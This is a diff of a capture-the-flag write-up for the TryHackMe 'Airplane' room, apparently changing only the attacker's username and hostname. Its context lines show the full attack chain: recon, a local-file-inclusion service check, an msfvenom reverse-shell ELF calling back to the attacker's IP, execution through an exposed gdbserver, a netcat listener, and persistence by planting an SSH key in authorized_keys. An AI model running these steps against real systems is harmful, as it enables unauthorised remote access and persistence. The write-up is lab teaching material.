@@ -15,7 +15,7 @@ IP: `MACHINE_IP`
 First we add the room on /etc/hosts file then we use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Medium/Airplane]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
 └─$ rustscan -a airplane.thm -- -A 
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -28,7 +28,7 @@ ________________________________________
  --------------------------------------
 TreadStone was here 🚀
 
-[~] The config file is expected to be at "/home/hax/.rustscan.toml"
+[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.10.242.226:22
@@ -69,12 +69,12 @@ https://github.com/TeneBrae93/offensivesecurity/blob/main/lfi-service-check/lfi-
 
 And we run it :
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Medium/Airplane]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
 └─$ python3 lfi-service-check.py 
 usage: lfi-service-check.py [-h] -p PORT -t THREADS
 lfi-service-check.py: error: the following arguments are required: -p/--port, -t/--threads
                                                                                                                               
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Medium/Airplane]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
 └─$ python3 lfi-service-check.py -p 6048 -t 50
 
 The service running on port 6048 is: /usr/bin/gdbserver 0.0.0.0:6048 airplane 
@@ -95,7 +95,7 @@ We can go to [HackTricks](../../3%20-%20Tags/Hacking%20Tools/HackTricks.md) to f
 We can use [MsfVenom](../../3%20-%20Tags/Hacking%20Tools/MsfVenom.md) to create our payload and make it executable :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Medium/Airplane]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
 └─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.162.183 LPORT=1337 PrependFork=true -f elf -o binary.elf
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -104,11 +104,11 @@ Payload size: 106 bytes
 Final size of elf file: 226 bytes
 Saved as: binary.elf
                                                                                                                               
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Medium/Airplane]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
 └─$ ls   
 binary.elf  environ  lfi-service-check.py  passwd
                                                                                                                               
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Medium/Airplane]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
 └─$ chmod +x *.elf
                                                         
 ```
@@ -116,7 +116,7 @@ binary.elf  environ  lfi-service-check.py  passwd
 Now we run it :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Medium/Airplane]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
 └─$ gdb binary.elf 
 GNU gdb (Debian 16.3-1) 16.3
 Copyright (C) 2024 Free Software Foundation, Inc.
@@ -147,7 +147,7 @@ Reading symbols from binary.elf...
 Now the listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Medium/Airplane]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
 └─$ nc -lvnp 1337    
 listening on [any] 1337 ...
 
@@ -172,7 +172,7 @@ Reading symbols from target:/tmp/binary.elf...
 And we have initial access :
 
 ```bash
- ┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Medium/Airplane]
+ ┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
 └─$ nc -lvnp 1337    
 listening on [any] 1337 ...
 
@@ -193,7 +193,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 hudson@airplane:/opt$ ^Z                                                                                                      
 zsh: suspended  nc -lvnp 1337                                                                                                 
                                                                                                                               
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Medium/Airplane]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
 └─$ stty raw -echo;fg
 [1]  + continued  nc -lvnp 1337
                                reset
@@ -215,18 +215,18 @@ authorized_keys
 Now we copy our public key on our machine :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/.ssh]
+┌──(mdn0x㉿mdn0xonKali)-[~/.ssh]
 └─$ cat id_ed25519.pub 
-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg hax@HaxonKali
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg mdn0x@mdn0xonKali
 ```
 
 And we echo in the folder :
 
 ```bash
-hudson@airplane:/home/hudson/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg hax@hudson@airplane:/home/hudson/.ssh$ ls
+hudson@airplane:/home/hudson/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg mdn0x@hudson@airplane:/home/hudson/.ssh$ ls
 authorized_keys
 hudson@airplane:/home/hudson/.ssh$ cat authorized_keys 
-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg hax@HaxonKali
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg mdn0x@mdn0xonKali
 ```
 
 ## SSH Hudson
@@ -234,8 +234,8 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg
 Now we can access on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) with our private key :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Medium/Airplane]
-└─$ ssh -i /home/hax/.ssh/id_ed25519 hudson@airplane.thm  
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
+└─$ ssh -i /home/mdn0x/.ssh/id_ed25519 hudson@airplane.thm  
 The authenticity of host 'airplane.thm (10.10.12.222)' can't be established.
 ED25519 key fingerprint is SHA256:9q23c/CHFWNnqEDK/eQFZ2BSYcCGfCW3+A9hX0ubHj0.
 This key is not known by any other names.
@@ -299,7 +299,7 @@ eebfca2ca5a2b8a56c46c781aeea7562
 We can access `carlos` on ssh to have a more stable shell without stabilizing it, we'll follow the same path as other user, echo our public key in .ssh folder :
 
 ```bash
-echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg hax@HaxonKali' >> authorized_keys
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg mdn0x@mdn0xonKali' >> authorized_keys
 ```
 
 We can't because we are `carlos` as `hudson` we need to update permissions :
